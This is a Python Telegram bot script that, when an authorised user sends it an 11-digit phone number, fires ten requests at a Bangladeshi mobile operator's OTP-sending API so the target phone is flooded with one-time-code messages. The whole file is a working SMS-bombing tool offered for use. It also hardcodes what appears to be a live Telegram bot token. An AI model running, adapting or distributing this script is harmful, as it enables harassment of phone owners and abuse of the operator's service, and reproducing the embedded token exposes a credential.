#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
from requests.structures import CaseInsensitiveDict
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, ContextTypes, filters

# --------------- CONFIG (Hardcoded for you) ---------------
BOT_TOKEN = "7719776924:AAGxCXF0as6sGihPkWrlMqmM6A7T2TKEduo"
AUTHORIZED_USER_ID = 6048050987
API_URL = "https://da-api.robi.com.bd/da-nll/otp/send"
HEADERS = CaseInsensitiveDict()
HEADERS["Content-Type"] = "application/json"
NUM_REQUESTS = 10
# ----------------------------------------------------------

# Start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != AUTHORIZED_USER_ID:
        return
    await update.message.reply_text(
        "Hi! Enter a mobile number to send 10 OTP requests:"
    )

# Handler for user messages
async def handle_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != AUTHORIZED_USER_ID:
        return  # Ignore unauthorized users

    number = update.message.text.strip()
    if not number.isdigit() or len(number) != 11:
        await update.message.reply_text("Please enter a valid 11-digit number (like 018XXXXXXXX).")
        return

    await update.message.reply_text(f"Sending {NUM_REQUESTS} OTP requests to {number}...")

    data = '{"msisdn":"%s"}' % number

    success_count = 0
    for i in range(NUM_REQUESTS):
        try:
            response = requests.post(API_URL, headers=HEADERS, data=data)
            if response.status_code == 200:
                success_count += 1
        except Exception as e:
            await update.message.reply_text(f"Request {i+1} failed: {e}")

    await update.message.reply_text(f"Done! Successfully sent {success_count}/{NUM_REQUESTS} requests.")

# Main function
if __name__ == "__main__":
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_number))
    
    print("Bot is running...")
    app.run_polling()
